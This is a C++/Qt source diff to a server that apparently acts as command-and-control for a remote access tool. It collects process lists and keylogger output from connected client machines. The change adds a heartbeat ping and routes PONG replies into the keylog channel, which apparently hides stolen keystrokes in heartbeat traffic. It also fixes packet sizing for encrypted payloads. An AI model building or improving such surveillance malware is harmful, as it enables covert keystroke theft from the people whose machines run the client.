@@ -16,7 +16,7 @@ namespace inferno {
 
 
 Server::Server(uint16_t port, QObject* parent) 
-    : QObject(parent), m_port(port), m_running(false) {}
+    : QObject(parent), m_port(port), m_running(false), m_last_heartbeat(std::time(nullptr)) {}
 
 Server::~Server() {
     stop();
@@ -81,6 +81,17 @@ void Server::run() {
         if (activity < 0) {
             std::cerr << "[Server] select() error\n";
             break;
+        }
+
+        // Heartbeat — send PING to all clients every 5 seconds
+        time_t now = std::time(nullptr);
+        if (now - m_last_heartbeat >= 5) {
+            m_last_heartbeat = now;
+            Packet ping(static_cast<uint16_t>(Opcode::PING), "");
+            std::vector<uint8_t> ping_data = ping.serialize();
+            for (auto& client : m_clients) {
+                client.socket.sendData(ping_data);
+            }
         }
 
         // New client connection
@@ -184,13 +195,19 @@ void Server::processPacketBuffer(ClientContext& client) {
                 }
                 emit processListReceived(QString::fromStdString(client.socket.getIp()), output);
             }
+        } else if (opcode == static_cast<uint16_t>(Opcode::PONG)) {
+            if (!payload.empty()) {
+                emit keylogReceived(QString::fromStdString(client.socket.getIp()),
+                                   QString::fromStdString(
+                                       sanitizeOutput(payload_str, 0, payload_str.size())));
+            }
         } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DATA)) {
             emit keylogReceived(QString::fromStdString(client.socket.getIp()), 
                                QString::fromStdString(sanitizeOutput(payload_str, 12, payload_str.size()-12)));
         }
 
-        // Remove processed bytes from the buffer
-        size_t packet_size = sizeof(PacketHeader) + payload.size();
+        // Remove processed bytes from the buffer (wire size, not decrypted size)
+        size_t packet_size = sizeof(PacketHeader) + packet_opt->getWirePayloadSize();
         client.buffer.erase(client.buffer.begin(), client.buffer.begin() + packet_size);
     }
 }
